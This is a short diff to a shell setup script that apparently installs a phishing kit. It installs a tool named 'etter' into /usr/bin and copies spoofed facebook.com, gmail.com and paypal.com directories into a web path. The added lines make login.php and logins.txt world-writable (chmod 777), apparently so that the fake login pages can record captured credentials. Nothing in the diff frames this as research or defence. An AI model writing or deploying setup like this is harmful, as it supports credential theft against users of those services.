@@ -19,12 +19,18 @@ echo
 echo -e "${bleu}Starting the setup steps"
 echo
 
-chmod +x etter
+chmod +x etter -v
+
+chmod 777 facebook.com/login.php -v
+chmod 777 facebook.com/logins.txt -v
+
+chmod 777 paypal.com/login.php -v
+chmod 777 paypal.com/logins.txt -v
 
 cp etter /usr/bin
 cp -r facebook.com/ $path
 cp -r gmail.com/ $path
 cp -r paypal.com/ $path
 
-echo -e "${green}All Done !!"
+echo -e "${green}[All Done !!]"
 echo
